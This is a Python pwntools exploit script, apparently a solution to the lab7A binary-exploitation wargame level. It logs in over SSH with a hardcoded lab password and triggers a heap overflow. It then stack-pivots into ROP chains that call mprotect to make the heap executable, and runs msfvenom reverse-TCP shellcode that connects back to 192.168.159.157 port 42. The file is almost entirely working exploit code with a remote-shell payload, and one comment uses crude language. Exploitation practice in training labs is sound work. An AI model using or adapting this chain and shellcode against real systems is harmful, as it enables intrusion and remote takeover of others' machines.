#!/usr/bin/env python3
#
# ROPgadget --binary lab7A > rop.txt
#

import sys
import struct

from pwn import *

def main():

  session = ssh(host="192.168.159.129", user="lab7A", password="us3_4ft3r_fr33s_4re_s1ck")
  sh = session.process("/bin/sh", env={"PS1":""})
  sendget(sh, "/levels/lab07/lab7A")

  corrupt_structure(sh)
  exploit(sh)

def exploit(sh):

  # msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.159.157 LPORT=42 -f python -v shellcode
  shellcode =  b""
  shellcode += b"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1"
  shellcode += b"\xb0\x66\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49"
  shellcode += b"\x79\xf9\x68\xc0\xa8\x9f\x9d\x68\x02\x00\x00"
  shellcode += b"\x2a\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89"
  shellcode += b"\xe1\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f"
  shellcode += b"\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b"
  shellcode += b"\xcd\x80"

  # trigger the heap overflow once more and overwrite the
  # print_message pointer with our stackpivot
  sendget(sh, "2")
  sendget(sh, "0")

  offset  = b"A" * 140
  pivot   = struct.pack('<I', 0x08086e77) # add esp, 0x11 ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
  rest    = gen_ropchain_two()
  rest   += shellcode

  log.info("Overwriting pointer to print_message within new structure")
  payload = offset + pivot + rest
  sendget(sh, payload)

  log.success("Who says we need a memory leak?")
  sendget(sh, "4")
  sendget(sh, b"1" + gen_ropchain_one())

# gen_ropchain_two: final rop chain, after triggering heap flip
def gen_ropchain_two():

  #
  # EAX == mprotect(
  #   (EBX) void *addr = StartOfHeap (the starting address MUST be the start of a memory page),
  #   (ECX) size_t len = 0x22000 (size),
  #   (EDX) int prot = 0x07 (READ|WRITE|EXECUTE)
  #
  rop_gadgets = [
    0x08053ebe, # ret
    0x08053ebe, # ret
    0x080e76ad, # pop ecx ; ret
    0x1110f629, #
    0x0804838e, # pop ebp ; ret
    0x11111111, #
    0x0808391a, # sub ebp, ecx ; ret (0x11111111 - 0x1110f629 = 0x1ae8)
    0x08097e08, # mov eax, esi ; pop ebx ; pop esi ; pop edi ; ret
    0x41414141, # <compensate pop>
    0x41414141, # <compensate pop>
    0x41414141, # <compensate pop>
    0x0805581a, # sub eax, ebp ; pop ebp ; ret (EAX=>HEAP_CHUNK - 0x1ae8 = HEAP_BASE)
    0x41414141, # <compensate pop>
    0x080aad9c, # xchg eax, edx ; ret
    0x0805dfff, # mov esi, edx ; ret
    0x080481c9, # pop ebx ; ret
    0xffffffff, #
    0x080dce5d, # inc ebx ; ret 
    0x080e76ad, # pop ecx ; ret
    0xeeeeffff, #
    0x0804846f, # pop edi ; ret
    0x11132001, #
    0x080dd199, # add ecx, edi ; add cl, byte ptr [edx] ; ret (0xeeeeffff + 0x11132001 = 0x22000) [ECX]
    0x08067323, # add ebx, esi ; movq qword ptr [edx], mm0 ; mov eax, edx ; ret (HEAP_PTR - 0x1ae8 = BASE) [EBX]
    0x08055bd5, # mov edx, 0xffffffff ; ret
    0x0805ea27, # inc edx ; ret
    0x0805ea27, # inc edx ; ret
    0x0805ea27, # inc edx ; ret
    0x0805ea27, # inc edx ; ret
    0x0805ea27, # inc edx ; ret
    0x0805ea27, # inc edx ; ret
    0x0805ea27, # inc edx ; ret
    0x0805ea27, # inc edx ; ret [EDX]
    0x0804838e, # pop ebp ; ret
    0x11111094, #
    0x080bd226, # pop eax ; ret
    0x11111111, #
    0x0805581a, # sub eax, ebp ; pop ebp ; ret [EAX]
    0x41414141, # <compensate pop>
    0x080709e0, # int 0x80 ; ret
    0x080c2cb4, # jmp esp
    0x90909090, #
  ]

  return b''.join(struct.pack('<I', _) for _ in rop_gadgets)

# gen_ropchain_one: we make our own mofucking heap flips bitch (cutting it close)
def gen_ropchain_one():
  
  rop_gadgets = [
    0x0806a79f, # nop ; mov eax, edx ; ret
    0x0807cd75, # nop ; inc eax ; ret
    0x0807cd75, # nop ; inc eax ; ret
    0x0807cd75, # nop ; inc eax ; ret
    0x0807cd75, # nop ; inc eax ; ret
    0x0805dfff, # mov esi, edx ; ret (backup heap chunk address)
    0x0804bb6c, # xchg eax, esp ; ret (heap flip)
  ]

  return b''.join(struct.pack('<I', _) for _ in rop_gadgets)

# leak_address: leverage the heap overflow and currupt datalen member
def corrupt_structure(sh):

  # create the the structure, and overwrite the data length stored
  # within the structure (HEAP OVERFLOW)
  sendget(sh, "1")
  sendget(sh, ("%d" % 0x83))
  sendget(sh, "A" * 0x80 + "\xff\xff\n")
  log.info("Overwriting data length member within allocated structure")

  # create a new structure
  log.info("Allocating a new structure")
  sendget(sh, "1")
  sendget(sh, "7")
  sendget(sh, "wetw0rk")

  return

def sendget(sh, message, print_output=False):

  sh.sendline(message)
  if print_output == False:
    sh.read()
  else:
    return sh.read()

  return

main()
